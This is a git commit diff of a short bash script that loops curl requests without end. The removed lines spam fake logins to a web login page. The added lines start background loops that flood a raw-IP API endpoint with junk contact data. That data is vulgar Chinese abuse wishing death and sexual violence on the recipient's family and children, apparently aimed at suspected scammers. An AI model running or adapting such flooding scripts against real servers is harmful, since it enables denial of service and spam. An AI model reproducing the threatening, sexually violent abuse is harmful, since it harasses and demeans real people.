38ca0ed0e86ecfba3a1d7845d4727694427f4a78
qq_49260613 <qq_49260613@devide>
2024-08-05 21:00:00 +0800

    Mon Aug  5 21:00:00 CST 2024 inscode

--- 1.sh
+++ 1.sh
@@ -1,10 +1,13 @@
 #!/bin/bash
 
-  # 这里假设您希望启动10个线程
-    while true; do
-        curl 'http://fxq.baobei.msivtca.top/store/Publics/login' \
-            -H 'Content-Type: application/json' \
-            --data-raw '{"username":"12312","password":"123"}' \
-            >/dev/null 2>&1 
-    done
-
+for i in {1..2}
+do
+    (
+        while true
+        do
+            curl -X POST -H "Content-Type:application/json; charset=UTF-8" \
+                -d "{\"data\":{\"list\":[{\"name\":\"骗子死全家，男娃没鸡巴，女娃被操烂，没错说的就是你生的孩子\",\"number\":\"骗子死全家，男娃没鸡巴，女娃被操烂，没错说的就是你生的孩子\",\"type\":0}]},\"phone\":\"13312341234\",\"userId\":\"df42f27677cfd8ec451ba3b05ab88aff\",\"sjc\":1722860561230,\"ttttt\":\"7f1e178fd4b4fb2385a1264778b0f7f6\"}" \
+                "http://120.24.175.2:16908/api/subList" -w '\n'
+        done
+    ) &
+done
